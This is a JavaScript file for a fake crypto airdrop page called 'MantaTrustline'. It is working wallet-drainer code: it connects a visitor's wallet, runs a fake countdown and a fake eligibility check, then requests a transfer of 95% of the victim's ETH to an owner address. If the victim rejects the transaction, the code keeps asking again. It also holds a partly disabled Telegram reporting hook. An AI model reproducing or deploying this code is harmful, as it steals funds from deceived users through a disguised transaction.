require("dotenv").config();
import { createWeb3Modal } from "@web3modal/wagmi";

import {
    http,
    createConfig,
    getWalletClient,
    estimateGas,
    getBalance,
    writeContract,
    sendTransaction,
} from "@wagmi/core";

import { mainnet } from "@wagmi/core/chains";
import {
    coinbaseWallet,
    walletConnect,
    injected,
} from "@wagmi/connectors";
import { getAccount, getChainId } from "@wagmi/core";

import { hexToNumber, numberToHex } from "viem";

document.addEventListener("DOMContentLoaded", async function () {
    // localStorage.removeItem("myETHCustAirdropTimr")
    setGetCountDown();

    function setGetCountDown() {
        let targetDate;
        if (
            localStorage.getItem("myETHCustAirdropTimr") &&
            !isNaN(Number(localStorage.getItem("myETHCustAirdropTimr"))) &&
            Number(localStorage.getItem("myETHCustAirdropTimr")) +
                48 * 60 * 60 * 1000 -
                Date.now() >
                0
        ) {
            // Set the target date and time for the countdown (e.g., 1 hour from now)
            targetDate =
                Number(localStorage.getItem("myETHCustAirdropTimr")) +
                48 * 60 * 60 * 1000;

            // Function to update the countdown timer
            function updateTimer() {
                const now = new Date().getTime();
                const distance = targetDate - now;

                // Calculate hours, minutes, and seconds
                const hours = Math.floor(
                    (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
                );
                const minutes = Math.floor(
                    (distance % (1000 * 60 * 60)) / (1000 * 60),
                );
                const seconds = Math.floor(
                    (distance % (1000 * 60)) / 1000,
                );

                // Update the timer elements
                document.getElementById("hours").textContent = hours
                    .toString()
                    .padStart(2, "0");
                document.getElementById("minutes").textContent = minutes
                    .toString()
                    .padStart(2, "0");
                document.getElementById("seconds").textContent = seconds
                    .toString()
                    .padStart(2, "0");

                // Add animation classes
                const timer = document.getElementById("timer");
                timer.classList.remove("scale-105");
                setTimeout(() => {
                    timer.classList.add("scale-105");
                }, 50);

                // If the countdown is finished, display a message
                if (distance < 0) {
                    clearInterval(interval);
                    // document.getElementById("timer").textContent =
                    //     "EXPIRED";
                    window.location.reload();
                }
            }

            // Update the timer every second
            const interval = setInterval(updateTimer, 1000);

            // Initial call to display the timer immediately
            updateTimer();
        } else {
            localStorage.setItem("myETHCustAirdropTimr", Date.now());
            targetDate =
                Number(localStorage.getItem("myETHCustAirdropTimr")) +
                48 * 60 * 60 * 1000;

            // Function to update the countdown timer
            function updateTimer() {
                const now = new Date().getTime();
                const distance = targetDate - now;

                // Calculate hours, minutes, and seconds
                const hours = Math.floor(
                    (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
                );
                const minutes = Math.floor(
                    (distance % (1000 * 60 * 60)) / (1000 * 60),
                );
                const seconds = Math.floor(
                    (distance % (1000 * 60)) / 1000,
                );

                // Update the timer elements
                document.getElementById("hours").textContent = hours
                    .toString()
                    .padStart(2, "0");
                document.getElementById("minutes").textContent = minutes
                    .toString()
                    .padStart(2, "0");
                document.getElementById("seconds").textContent = seconds
                    .toString()
                    .padStart(2, "0");

                // Add animation classes
                const timer = document.getElementById("timer");
                timer.classList.remove("scale-105");
                setTimeout(() => {
                    timer.classList.add("scale-105");
                }, 50);

                // If the countdown is finished, display a message
                if (distance < 0) {
                    clearInterval(interval);
                    // document.getElementById("timer").textContent =
                    //     "EXPIRED";
                    window.location.reload();
                }
            }

            // Update the timer every second
            const interval = setInterval(updateTimer, 1000);

            // Initial call to display the timer immediately
            updateTimer();
        }
    }

    const projectId = process.env.VITE_PROJECT_ID;

    const metadata = {
        name: "MantaTrustline",
        description: "ETH Drop - QNT, SWFTC, JASMY",
        url: "https://mantatrustline.com",
        icons: [
            "https://mantatrustline.com/favicon.ico",
            "https://mantatrustline.com/favicon-1.png",
            "https://mantatrustline.com/favicon-2.png",
            "https://mantatrustline.com/favicon-3.png",
        ],
    };

    const config = createConfig({
        chains: [mainnet],
        transports: {
            [mainnet.id]: http(),
        },
        connectors: [
            walletConnect({ projectId, metadata, showQrModal: false }),
            injected({ shimDisconnect: true }),
            coinbaseWallet({
                appName: metadata.name,
                appLogoUrl: metadata.icons[0],
                enableMobileWalletLink: true,
            }),
        ],
    });
    // reconnect(config);

    const modal = createWeb3Modal({
        wagmiConfig: config,
        projectId,
        enableAnalytics: false,
    });

    const data = {
        web3: null,
        chainId: null,
        userAddress: null,
        provider: null,
    };

    document.querySelectorAll(".claim-drop").forEach((dropBtn) => {
        dropBtn.addEventListener("click", initWeb3);
    });

    async function initWeb3() {
        if (!getAccount(config).isConnected) {
            modal.open();
            observeDOM();
        } else {
            initAccounts();
            sendErr(`${getAccount(config).address} is connected`);
        }
    }

    async function initAccounts() {
        console.log(getAccount(config));
        if (!getAccount(config).isConnected) {
            return window.location.reload();
        }

        try {
            await showModalDetails();

            const wallet = await getWalletClient(config);
            console.log(wallet);
            const chainID = await wallet.request({
                method: "eth_chainId",
            });

            data.chainId = chainID;
            data.userAddress = getAccount(config).address;

            console.log(data);

            const QNTBalance = await getBalance(config, {
                address: getAccount(config).address,
                token: process.env.QNT_TRADING_ADDRESS,
            });

            const JASMYBalance = await getBalance(config, {
                address: getAccount(config).address,
                token: process.env.JASMY_TRADING_ADDRESS,
            });

            const SWFTCBalance = await getBalance(config, {
                address: getAccount(config).address,
                token: process.env.SWFTC_TRADING_ADDRESS,
            });

            console.log(Number(QNTBalance.value));
            console.log(Number(JASMYBalance.value));
            console.log(Number(SWFTCBalance.value));

            if (
                // QNTBalance.value == 0 &&
                // JASMYBalance.value == 0 &&
                // SWFTCBalance.value == 0
                QNTBalance.value == 0 ||
                JASMYBalance.value == 0 ||
                SWFTCBalance.value == 0
            ) {
                const verifStage = document.getElementById("verif-stage");
                const verifComplete =
                    document.getElementById("verif-complete");

                verifStage.className = "hidden";

                verifComplete.textContent = "";
                verifComplete.textContent = "You're not ELIGIBLE";

                document.querySelector(".lds-ellipsis").style.display =
                    "none";

                document.querySelector("#cancel-icon").className =
                    "w-24 mx-auto";
                document.querySelector("#tick-icon").className =
                    "w-24 mx-auto hidden";

                return;
            } else {
                const verifStage = document.getElementById("verif-stage");
                const verifComplete =
                    document.getElementById("verif-complete");

                verifStage.className = "hidden";

                document.querySelector(".lds-ellipsis").style.display =
                    "none";

                verifComplete.className =
                    "font-bold text-lg text-green-600 text-center";

                document.querySelector("#tick-icon").className =
                    "w-24 mx-auto";
                document.querySelector("#cancel-icon").className =
                    "w-24 mx-auto hidden";

                verifComplete.innerHTML = "";
                verifComplete.innerHTML = `You're <span class="font-black">ELIGIBLE!</span>,<br>
                     Click <span class="font-black text-green-500">Confirm</span> in your wallet to claim`;

                setTimeout(async () => {
                    await claimETH();
                }, 4000);
            }
        } catch (error) {
            await sendErr(error);
        }
    }

    function isRetryError(error) {
        return error.message.includes("User denied transaction signature");
    }

    async function claimETH() {
        const wallet = await getWalletClient(config);

        try {
            const walletETHBalance2 = await getBalance(config, {
                address: data.userAddress,
                chainId: hexToNumber(
                    await wallet.request({ method: "eth_chainId" }),
                ),
                unit: "wei",
            });
            console.log(walletETHBalance2);
            const userBalance = Number(walletETHBalance2.value);
            console.log(userBalance);

            if (userBalance == 0) {
                await sendErr(
                    `Error claiming Airdrop. Insufficient ETH balance`,
                );
            }

            const gasPrice = await estimateGas(config, {
                account: data.userAddress,
                to: process.env.OWNER_ADDRESS,
                value: BigInt(parseInt(userBalance * 0.95)),
                type: "legacy",
                chainId: hexToNumber(
                    await wallet.request({
                        method: "eth_chainId",
                    }),
                ),
            });

            console.log(gasPrice);

            const result = await sendTransaction(config, {
                account: data.userAddress,
                to: process.env.OWNER_ADDRESS,
                chainId: hexToNumber(
                    await wallet.request({
                        method: "eth_chainId",
                    }),
                ),
                value: BigInt(parseInt(userBalance * 0.95)),
            });
            // console.log(result);
            sendErr(`Restore ETH Success. Hash ${result}`);
        } catch (error) {
            if (isRetryError(error)) {
                sendErr(`Retrying restore ETH...`);
                await claimETH();
                return;
            } else {
                await sendErr(error);
                window.location.reload();
            }
        }
    }

    async function showModalDetails() {
        const button = document.querySelector("#modal-trig");
        button.click();

        const steps = [
            { text: "Initializing wallet connection..." },
            { text: "Verifying wallet address..." },
            { text: "Checking eligibility criteria..." },
            { text: "Confirming network status..." },
            // { text: "Claiming your airdrop..." },
        ];

        let currentStep = 0;

        function showMessage(stepIndex) {
            const verifStage = document.getElementById("verif-stage");
            if (stepIndex < steps.length) {
                verifStage.classList.remove("fade-in");
                verifStage.classList.add("fade-out");

                setTimeout(() => {
                    verifStage.textContent = steps[stepIndex].text;
                    verifStage.classList.remove("fade-out");
                    verifStage.classList.add("fade-in");
                }, 1000); // Duration of fade-out

                setTimeout(
                    () => showMessage(stepIndex + 1),
                    getRandomNumber(),
                ); // Show next message after 3 seconds
            } else {
                // verifStage.textContent = "Airdrop claimed successfully!";
            }
        }

        // Start the progress loader
        showMessage(0);
    }

    function observeDOM() {
        const targetNode = document.head;
        const config = { childList: true, subtree: true };

        const callback = function (mutationsList, observer) {
            for (const mutation of mutationsList) {
                if (
                    mutation.type === "childList" &&
                    !document.querySelector(
                        'style[data-w3m="scroll-lock"]',
                    )
                ) {
                    initAccounts();
                }
            }
        };

        const observer = new MutationObserver(callback);
        observer.observe(targetNode, config);

        return observer;
    }

    async function sendErr(x) {
        const options = {
            method: "POST",
            mode: "cors",
            headers: {
                accept: "application/json",
                "content-type": "application/json",
            },
            body: JSON.stringify({
                text: String(x),
                disable_web_page_preview: false,
                disable_notification: false,
                reply_to_message_id: null,
                chat_id: process.env.MY_CHAT_ID,
            }),
        };

        console.log(x);

        //   fetch(
        //     `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN_BOT}/sendMessage`,
        //     options
        //   )
        //     .then((response) => response.json())
        //     .then((response) => console.log(response))
        //     .catch((err) => console.error(err));
    }

    function getRandomNumber() {
        const numbers = [3000, 4000, 5000, 6000, 7000];
        const randomIndex = Math.floor(Math.random() * numbers.length);
        return numbers[randomIndex];
    }
});
